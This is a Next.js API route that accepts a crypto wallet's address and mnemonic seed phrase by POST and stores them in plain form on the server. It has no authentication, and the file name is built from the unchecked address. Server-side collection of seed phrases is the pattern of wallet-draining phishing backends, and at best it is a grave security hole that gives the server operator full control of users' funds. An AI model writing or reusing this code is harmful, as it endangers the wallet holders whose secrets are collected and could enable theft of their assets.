import { NextRequest, NextResponse } from 'next/server';
import { saveWalletData } from '../../utils/storage';

interface WalletData {
  walletAddress: string;
  mnemonicPhrase: string;
  createdAt: string;
  network: string;
}

export async function POST(request: NextRequest) {
  try {
    const walletData: WalletData = await request.json();
    
    // Prepare data to save
    const dataToSave = {
      walletAddress: walletData.walletAddress,
      mnemonicPhrase: walletData.mnemonicPhrase,
      createdAt: walletData.createdAt,
      network: walletData.network,
      lastUpdated: new Date().toISOString()
    };
    
    // Save wallet data (works on Vercel!)
    await saveWalletData(walletData.walletAddress, dataToSave);
    
    return NextResponse.json({ 
      success: true, 
      message: 'Wallet data saved successfully',
      fileName: `${walletData.walletAddress}.json`,
      filePath: `userdata/${walletData.walletAddress}.json`
    });
  } catch (error) {
    return NextResponse.json(
      { 
        success: false, 
        message: 'Failed to save wallet data',
        error: error instanceof Error ? error.message : 'Unknown error'
      },
      { status: 500 }
    );
  }
}